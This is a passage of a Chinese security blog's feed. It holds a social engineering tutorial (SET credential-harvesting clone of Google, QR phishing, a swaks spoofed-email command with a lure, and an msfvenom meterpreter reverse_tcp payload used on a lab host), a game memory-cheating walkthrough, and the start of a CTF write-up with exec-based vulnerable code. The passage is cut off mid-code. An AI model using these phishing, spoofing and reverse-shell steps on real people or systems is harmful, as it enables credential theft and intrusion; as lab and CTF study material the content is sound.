&lt;p&gt;&lt;a href=&quot;https://blog.xlab.app/p/4db211d2/&quot;&gt;https://blog.xlab.app/p/4db211d2/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>社会工程学</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/</id>
    <published>2024-12-12T06:25:22.000Z</published>
    <updated>2024-12-12T08:53:59.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><del>我超，盒！爱丽丝错了爱丽丝不该在网上口嗨的</del></p><span id="more"></span><hr><h1 id="Setoolkit"><a href="#Setoolkit" class="headerlink" title="Setoolkit"></a>Setoolkit</h1><p>Setoolkit 是一个为社会工程设计的开源渗透测试框架。SET 具有许多自定义攻击向量，可让我们快速进行可信的攻击。</p><p>root 启动 setoolkit</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212143724005.png" alt="image-20241212143724005"></p><p>默认会有如下选项：</p><ul><li>Social-Engineering Attacks ##社会工程学攻击</li><li>Penetration Testing (Fast-Track) ##快速追踪测试</li><li>Third Party Modules ##第三方模块</li><li>Update the Social-Engineer Toolkit ##升级软件</li><li>Update SET configuration ##升级配置</li><li>Help, Credits, and About ##帮助</li></ul><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="制作钓鱼网站"><a href="#制作钓鱼网站" class="headerlink" title="制作钓鱼网站"></a>制作钓鱼网站</h3><p>选择 1</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212143953923.png" alt="image-20241212143953923"></p><ol><li><p>鱼叉式网络钓鱼</p></li><li><p>网页攻击 钓鱼</p></li><li><p>感染性性攻击，就是木马</p></li><li><p>建立 payloaad 和 listener</p></li><li><p>邮件群发攻击</p></li><li><p>Arduino 基础攻击</p></li><li><p>无线接入点攻击</p></li><li><p>二维码攻击</p></li><li><p>Powershell 攻击</p></li><li><p>第三反模块</p></li></ol><p>这里选择 2</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212144123364.png" alt="image-20241212144123364"></p><ul><li>Java Applet Attack Method ## java 程序攻击</li><li>Metasploit Browser Exploit Method ##Metasploit 浏览器漏洞攻击</li><li>Credential Harvester Attack Method ##钓鱼网站攻击</li><li>Tabnabbing Attack Method</li><li>Web Jacking Attack Method ## 网站 jacking 攻击</li><li>Multi-Attack Web Method ## 多种网站攻击方式</li><li>HTA Attack Method</li><li>Return to Main Menu</li></ul><p>选择 3</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212144459114.png" alt="image-20241212144459114"></p><ul><li>Web Templates ## web</li><li>Site Cloner ## 网站克隆设置</li><li>Custom Import ## 自定义导入</li><li>Return to Webattack Menu</li></ul><p>选择 1</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212144743612.png" alt="image-20241212144743612"></p><p>指定 ip，然后选择要伪造的页面，这里选择伪造 google 的页面</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212145009413.png" alt="image-20241212145009413"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212144944674.png" alt="image-20241212144944674"></p><p>成功启动，尝试输入账密，点击登录，会重定向到 Google 搜索引擎</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212145127768.png" alt="image-20241212145127768"></p><p>于是恶意服务端会收到账密</p><hr><h3 id="二维码钓鱼"><a href="#二维码钓鱼" class="headerlink" title="二维码钓鱼"></a>二维码钓鱼</h3><p>SET 工具包中可以使用 QR Code Attack 模块发起二维码攻击，使被欺骗用户扫描你的二维码进入一个伪装钓鱼网站</p><p>选择模块 8</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212145720164.png" alt="image-20241212145720164"></p><p>输入要跳转的钓鱼网站的地址：192.168.253.128，生成二维码</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212150217152.png" alt="image-20241212150217152"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212150514405.png" alt="image-20241212150514405"></p><p>解析一下二维码，就是我们刚才钓鱼网站的 ip，如果直接扫码就会跳转到钓鱼网站</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212150714846.png" alt="image-20241212150714846"></p><hr><h1 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h1><p>当攻击者制作了钓鱼网站、木马程序后，便会想法设法将其传给受害者，而常见的传播方式便是钓鱼网站。安全意识较差的用户在收到钓鱼邮件后点击邮件中的钓鱼链接、下载附件中的木马程序，便可能遭受攻击</p><p>Swaks 是一款类似于“瑞士军刀”的工具，之所以这么说是因为它在 SMTP 邮件协议领域有非常非常广泛的应用，它通常被用来伪造邮件，进行钓鱼、社工等操作</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212151311380.png" alt="image-20241212151311380"></p><h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><p>先申请一个临时邮箱用于收件，本次使用的临时邮箱网站是：<a href="http://24mail.chacuo.net/?continueFlag=e50436a75b1a77d2a32a07038cb58972">http://24mail.chacuo.net/?continueFlag=e50436a75b1a77d2a32a07038cb58972</a></p><p>伪 造 一 份 来 自 l0w1ro 的 邮 件 ， 收 件 人 为 <a href="mailto:&#x64;&#101;&#115;&#x69;&#103;&#110;&#97;&#110;&#x74;&#53;&#49;&#x37;&#51;&#54;&#x40;&#x30;&#x32;&#55;&#x31;&#x36;&#x38;&#46;&#99;&#111;&#x6d;">&#x64;&#101;&#115;&#x69;&#103;&#110;&#97;&#110;&#x74;&#53;&#49;&#x37;&#51;&#54;&#x40;&#x30;&#x32;&#55;&#x31;&#x36;&#x38;&#46;&#99;&#111;&#x6d;</a> ， 内 容 为 : <code>&quot;Congratulations on obtaining 20000 Memories! Please click on the following link to get the redemption code: http://example.com/&quot;</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> swaks <span class="token parameter variable">--to</span> designant51736@027168.com <span class="token parameter variable">--from</span> l0w1ro@616.sb <span class="token parameter variable">--ehlo</span> <span class="token number">616</span>.sb <span class="token parameter variable">--body</span> <span class="token string">"Congratulations on obtaining 20000 Memories! Please click on the following link to get the redemption code: http://example.com/"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212153153141.png" alt="image-20241212153153141"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212153230252.png" alt="image-20241212153230252"></p><hr><h1 id="远控木马"><a href="#远控木马" class="headerlink" title="远控木马"></a>远控木马</h1><p>SET 同时集成了木马生成工具，可以生成木马并调用 MSF 框架对远程主机进行控制</p><h2 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h2><p>选择模块 4</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212154514509.png" alt="image-20241212154514509"></p><p>选择攻击模式，然后设置监听的主机 IP(kali 攻击机的 IP 地址)和端口，即可在本地生成木马程序</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212154908488.png" alt="image-20241212154908488"></p><p>使用 python 在 &#x2F;root&#x2F;.set&#x2F; 下起 http 服务传输 payload.exe（如果发现 payload.exe 大小为 0 则说明生成失败，使用<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.253.128 LPORT=8000 -a x86 --platform Windows -f exe &gt; payload.exe</code>来观察报错）</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164132551.png" alt="image-20241212164132551"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164310470.png" alt="image-20241212164310470"></p><p>运行木马</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164329371.png" alt="image-20241212164329371"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164437913.png" alt="image-20241212164437913"></p><p>检测到了 winxp 的 ip 地址</p><p>在窗口中回车激活 Meterpreter 会话，<code>sessions -i 1</code> 获取 shell控制权限</p><p>sysinfo 查看系统信息，screenshot 进行屏幕截图</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164640654.png" alt="image-20241212164640654"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164905169.png" alt="image-20241212164905169"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;del&gt;我超，盒！爱丽丝错了爱丽丝不该在网上口嗨的&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>游戏逆向</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/</id>
    <published>2024-12-11T13:48:45.000Z</published>
    <updated>2024-12-12T02:28:33.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>嘎姆，嘎姆~</p><span id="more"></span><hr><h1 id="Flash游戏逆向"><a href="#Flash游戏逆向" class="headerlink" title="Flash游戏逆向"></a>Flash游戏逆向</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>大部分的网页小游戏都是通过 Flash 进行制作的，想要修改网页小游戏的设置，我们就需要找到它的底层代码，所以将网页版本的小游戏下载后，反编译并分析其代码然后更改有关人物数据，进而可以达成“外挂”目的</p><p>在浏览器中游玩网页小游戏时，我们可以按 F12 键，找到一个后缀为.swf 的可下载文件，或者在设置中的 Internet 选项，在临时文件中查看 swf 文件，这就是网页小游戏的运行基础。在下载好该文件之后，我们就可以通过反编译得到游戏的运行代码了。</p><h3 id="JPEXS-反编译并修改"><a href="#JPEXS-反编译并修改" class="headerlink" title="JPEXS 反编译并修改"></a>JPEXS 反编译并修改</h3><p>首先，需要在游戏网页上将小游戏下载下来（swf 后缀的文件即是），通过 JPEXS Free Flash Decompiler 对此 swf 文件进行反编译，我们可以得到该游戏的组成代码、架构等信息</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212002301635.png" alt="image-20241212002301635"></p><p>组成该游戏的基础代码都在“脚本”栏目中，其中的 frame 文件存放了关键代码，定位“HP”字节</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212002621071.png" alt="image-20241212002621071"></p><p>我们可以查找到需要修改的代码段的具体位置，修改对应的 P 代码资源，对修改后的 .swf 文件进行保存</p><p>先修改人物主人公的血量，通过搜索“hp”来查看相关信息</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212003010043.png" alt="image-20241212003010043"></p><p>修改这里的 Base_hp 和 Now_hp</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212003318287.png" alt="image-20241212003318287"></p><p>修改完成后点击另存为到桌面</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212003422363.png" alt="image-20241212003422363"></p><p>重新运行游戏文件会发现游戏内容的数值已经被更改</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212004114526.png" alt="image-20241212004114526"></p><hr><h1 id="CE-逆向-Super-Mario-XP"><a href="#CE-逆向-Super-Mario-XP" class="headerlink" title="CE 逆向 Super Mario XP"></a>CE 逆向 Super Mario XP</h1><p>主要目的为：通过扫描内存地址实现无限子弹和修改游戏数据，包括寻找动态地址、锁定值、修改静态地址等内容。</p><h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><p>打开 cheat engine 加载游戏进程</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212010210915.png" alt="image-20241212010210915"></p><p>在启用 CE 时，我们需要锁定的目标数值为 10（即当前的红心数），那么在 CE 窗口中需要输入相对于的数值进行匹配，输入完成后，点击“开始扫描”</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212010331719.png" alt="image-20241212010331719"></p><p>在游戏里获取红心，比较前后值的变动发现红心数值内存地址</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212010531502.png" alt="image-20241212010531502"></p><p>右键修改value，然后对游戏进行操作一下使得数值进行变换</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212010800580.png" alt="image-20241212010800580"></p><p>成功找到生命值对应的地址 001EC578，从而修改生命值&#x2F;子弹数</p><hr><h1 id="Run-ZombieFoods"><a href="#Run-ZombieFoods" class="headerlink" title="Run!ZombieFoods!"></a>Run!ZombieFoods!</h1><h2 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h2><p>在CE中加载该进程</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212015153532.png" alt="image-20241212015153532"></p><p>我们运行游戏后，初始扫描的数值是 0&amp;98</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212015417475.png" alt="image-20241212015417475"></p><p>在游戏中等到食物进行消耗后再次扫描新的数值，这会方便我们找到对应的内存地址：</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212015533732.png" alt="image-20241212015533732"></p><p>得到有两个地址符合即 1186555C 和 11CA2FD0</p><p>我们分别对其进行修改锁定，先对 1186555C 值修改为 2221 并激活锁定</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212015727628.png" alt="image-20241212015727628"></p><p>回到游戏发现食物数量锁定在2221不会下降，说明这就是食物的真实内存地址：1186555C</p><p>同理，我们可以锁子弹</p><p>首先用同样的方式找到子弹的内存地址</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212020240813.png" alt="image-20241212020240813"></p><p>依旧是双地址，这次一起改一起锁上，分别是 11865558 和 11CA2FCC</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212020526497.png" alt="image-20241212020526497"></p><p>在对 Super Mario XP 的无限子弹和 Run!ZombieFoods! 的无限食物和子弹进行逆向内存地址修改数值后，发现这些数值的内存地址离的很近。发现有时候 Cheat Engine 扫描指定东西的多次变化数值后，仍然可能存在多个地址，这时候可以使用二分法，对一半数值进行修改，若游戏内无变化则内存地址在另一半中；若游戏内有变化则内存地址在这一半当中，多次后即可发现真正的内存地址。最后进行数值修改与锁定，从而达到无限的优势</p><hr><h1 id="CS1-6"><a href="#CS1-6" class="headerlink" title="CS1.6"></a>CS1.6</h1><h2 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤"></a>步骤</h2><p>启动 CS 游戏开启对局，进程放入 CE 中</p><p>观察到手枪子弹数为20，扫描一下，发现有部分内存地址的值会立刻变动，然后再次扫描直到地址数值结果不再变化为止</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212094521629.png" alt="image-20241212094521629"></p><p>扫出2000条，现在开一枪，扫描19直到地址数值不再变化</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212094633151.png" alt="image-20241212094633151"></p><p>现在是196条，重复操作进行扫描</p><p>发现依旧是196条</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212095001818.png" alt="image-20241212095001818"></p><p>Ctrl+A 右键选中所有地址结果，然后右键“加入选择的地址到地址清单”</p><p>结合二分法，按住 Shift 键选中一半地址内容，右键更改记录数值为 20。</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212095242790.png" alt="image-20241212095242790"></p><p>观察子弹数，变成了 20，但是点击射击后变成了 13 而不是 19，说明保存手枪子弹数的地址不在选中的部分，则删除前面选中部分的地址</p><p>用二分法重复上面的操作</p><p>最后测出来结果是042BBE74</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212095919344.png" alt="image-20241212095919344"></p><p>直接锁住子弹数</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212100012051.png" alt="image-20241212100012051"></p><p>连续开枪不掉子弹，验证成功</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;嘎姆，嘎姆~&lt;/p&gt;</summary>
    
    
    
    <category term="Rev" scheme="http://c1oudfl0w0.github.io/blog/categories/Rev/"/>
    
    
  </entry>
  
  <entry>
    <title>强网杯S8 Final</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/</id>
    <published>2024-12-05T00:35:46.000Z</published>
    <updated>2025-02-11T07:34:59.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我大概一辈子都忘不了强网杯了吧</p><span id="more"></span><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206181319593.png" alt="image-20241206181319593"></p><p>没有爆零，不是垫底，作为一个历史短暂的双非校队已经远超预期了（笑）</p><hr><h1 id="Jeopardy"><a href="#Jeopardy" class="headerlink" title="Jeopardy"></a>Jeopardy</h1><h2 id="Pharaoh’s-Pyramid"><a href="#Pharaoh’s-Pyramid" class="headerlink" title="Pharaoh’s Pyramid"></a>Pharaoh’s Pyramid</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> wsgiref<span class="token punctuation">.</span>simple_server <span class="token keyword">import</span> make_server<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>config <span class="token keyword">import</span> Configurator<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>events <span class="token keyword">import</span> NewResponse<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>response <span class="token keyword">import</span> Response<span class="token keyword">import</span> utilusers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>super_user <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span>default_alg <span class="token operator">=</span> <span class="token string">"RS"</span><span class="token keyword">def</span> <span class="token function">register_api</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> super_user<span class="token punctuation">:</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Not Allowed!"</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Please Input username &amp; password'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"500 Internal Server"</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">&#125;</span>    users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    token <span class="token operator">=</span> util<span class="token punctuation">.</span>data_encode<span class="token punctuation">(</span>data<span class="token punctuation">,</span> default_alg<span class="token punctuation">)</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Here is your token: "</span><span class="token operator">+</span> token<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register_front</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>util<span class="token punctuation">.</span>read_html<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">front_test</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>util<span class="token punctuation">.</span>read_html<span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">system_test</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>        token <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>        data <span class="token operator">=</span> util<span class="token punctuation">.</span>data_decode<span class="token punctuation">(</span>token<span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">:</span>            username <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span>            <span class="token keyword">if</span> username <span class="token keyword">in</span> super_user<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome super_user!"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Unauthorized'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"401 Unauthorized"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Unauthorized'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"401 Unauthorized"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Please Input code &amp; token'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Configurator<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> config<span class="token punctuation">:</span>        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'register_front'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'register_api'</span><span class="token punctuation">,</span> <span class="token string">'/api/register'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'system_test'</span><span class="token punctuation">,</span> <span class="token string">'/api/test'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'front_test'</span><span class="token punctuation">,</span> <span class="token string">'/test'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>system_test<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'system_test'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>front_test<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'front_test'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>register_api<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'register_api'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>register_front<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'register_front'</span><span class="token punctuation">)</span>        app <span class="token operator">=</span> config<span class="token punctuation">.</span>make_wsgi_app<span class="token punctuation">(</span><span class="token punctuation">)</span>    server <span class="token operator">=</span> make_server<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">6543</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审计代码，只需要以 admin 登录就能 rce</p><p>观察注册获取jwt的部分：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>super_user <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span>default_alg <span class="token operator">=</span> <span class="token string">"RS"</span>users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>token <span class="token operator">=</span> util<span class="token punctuation">.</span>data_encode<span class="token punctuation">(</span>data<span class="token punctuation">,</span> default_alg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">data_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> alg <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'HS'</span><span class="token punctuation">,</span> <span class="token string">'RS'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> <span class="token string">"Algorithm must be HS or RS!"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        private_key<span class="token punctuation">,</span> public_key <span class="token operator">=</span> generate_keys<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">'RS'</span><span class="token punctuation">:</span>            signature <span class="token operator">=</span> sign_data<span class="token 